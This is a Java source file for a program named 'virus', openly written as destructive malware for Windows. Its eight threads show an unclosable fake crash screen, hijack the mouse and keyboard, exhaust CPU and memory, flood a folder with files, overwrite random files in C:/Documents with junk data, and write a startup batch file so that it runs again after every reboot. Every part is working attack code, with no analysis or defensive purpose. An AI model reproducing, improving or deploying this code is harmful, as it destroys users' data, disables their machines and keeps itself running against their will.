import java.util.logging.*;
import java.io.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.util.Random;
import java.util.*;
import javax.swing.*;
public class virus {
    private static final Logger logger = Logger.getLogger(virus.class.getName());

    public static void main(String[] args) {
        new Thread(virus::runProgram1).start();
        new Thread(virus::runProgram2).start();
        new Thread(virus::runProgram3).start();
        new Thread(virus::runProgram4).start();
        new Thread(virus::runProgram5).start();
        new Thread(virus::runProgram6).start();
        new Thread(virus::runProgram7).start();
        new Thread(virus::runProgram8).start();
    }

    // Program 1: Display critical error message
    public static void runProgram1() {
        try {
            JFrame frame = new JFrame();
            frame.setUndecorated(true);
            frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);

            JLabel label = new JLabel("A critical error has occurred. System will restart.", SwingConstants.CENTER);
            label.setFont(new Font("Courier New", Font.BOLD, 30));
            label.setForeground(Color.RED);
            label.setBackground(Color.BLACK);
            label.setOpaque(true);
            frame.add(label);
            frame.setVisible(true);

            // long startTime = System.currentTimeMillis();
            // System.currentTimeMillis() - startTime < 5000
            while (true) {
                // Infinite loop until 5 seconds have passed
            }

            // frame.dispose();  // Close the frame after 5 seconds
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 1", e);
        }
    }

    // Program 2: Random mouse movement
    public static void runProgram2() {
        try {
            Robot robot = new Robot();
            Random random = new Random();
            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
            int screenWidth = screenSize.width;
            int screenHeight = screenSize.height;

            // long startTime = System.currentTimeMillis();
            // System.currentTimeMillis() - startTime < 2500
            while (true) {
                int x = random.nextInt(screenWidth);
                int y = random.nextInt(screenHeight);
                robot.mouseMove(x, y);
                Thread.sleep(10);
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 2", e);
        }
    }

    // Program 3: Press all keys repeatedly
    public static void runProgram3() {
        try {
            Robot robot = new Robot();
            // long startTime = System.currentTimeMillis();
            while (true) {
                for (int i = KeyEvent.VK_A; i <= KeyEvent.VK_Z; i++) {
                    robot.keyPress(i);
                    robot.keyRelease(i);
                }
                for (int i = KeyEvent.VK_0; i <= KeyEvent.VK_9; i++) {
                    robot.keyPress(i);
                    robot.keyRelease(i);
                }
                for (int i = KeyEvent.VK_F1; i <= KeyEvent.VK_F12; i++) {
                    robot.keyPress(i);
                    robot.keyRelease(i);
                }
                int[] specialKeys = {
                        KeyEvent.VK_ENTER, KeyEvent.VK_SPACE, KeyEvent.VK_SHIFT,
                        KeyEvent.VK_CONTROL, KeyEvent.VK_ALT, KeyEvent.VK_TAB,
                        KeyEvent.VK_BACK_SPACE, KeyEvent.VK_ESCAPE, KeyEvent.VK_CAPS_LOCK
                };
                for (int key : specialKeys) {
                    robot.keyPress(key);
                    robot.keyRelease(key);
                }

                Thread.sleep(100);
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 3", e);
        }
    }

    // Program 4: Heavy computation
    public static void runProgram4() {
        try {
            //long startTime = System.currentTimeMillis();
            while (true) {
                new Thread(() -> {
                    while (true) {
                        Math.pow(Math.random(), Math.random());
                    }
                }).start();
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 4", e);
        }
    }

    // Program 5: File creation in a directory
    public static void runProgram5() {
        try {
            File folder = new File("C:/Desktop");
            folder.mkdir();
            // long startTime = System.currentTimeMillis();
            int counter = 0;

            while (true) {
                File file = new File(folder, "File_" + counter + ".txt");
                try (FileWriter writer = new FileWriter(file)) {
                    writer.write("This is file number: " + counter);
                }
                counter++;
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 5", e);
        }
    }

    // Program 6: Memory allocation
    public static void runProgram6() {
        try {
            ArrayList<int[]> memoryHog = new ArrayList<>();
            //long startTime = System.currentTimeMillis();

            while (true) {
                memoryHog.add(new int[10_000_000]);
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 6", e);
        }
    }

    // Program 7: File corruption by writing random data
    public static void runProgram7() {
        try {
            File directory = new File("C:/Documents");
            Random random = new Random();
            // long startTime = System.currentTimeMillis();

            while (true) {
                File[] files = directory.listFiles();
                if (files != null && files.length > 0) {
                    File target = files[random.nextInt(files.length)];
                    try (FileOutputStream fos = new FileOutputStream(target)) {
                        byte[] junkData = new byte[1024];
                        random.nextBytes(junkData);
                        fos.write(junkData);
                    }
                }
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 7", e);
        }
    }

    // Program 8: Ensures the virus runs persistently after reboot
    public static void runProgram8() {
        try {
            String startupPath = System.getProperty("user.home") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
            String virusFilePath = new File(virus.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath();
            File virusFile = new File(startupPath, "virus.bat");

            if (!virusFile.exists()) {
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(virusFile))) {
                    writer.write("java -jar " + virusFilePath); // This creates a batch file that runs the virus after reboot
                }
            }

            // Make sure the program keeps running persistently
            while (true) {
                Thread.sleep(500);  // Keeps the program running
            }
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Error in Program 8", e);
        }
    }
}
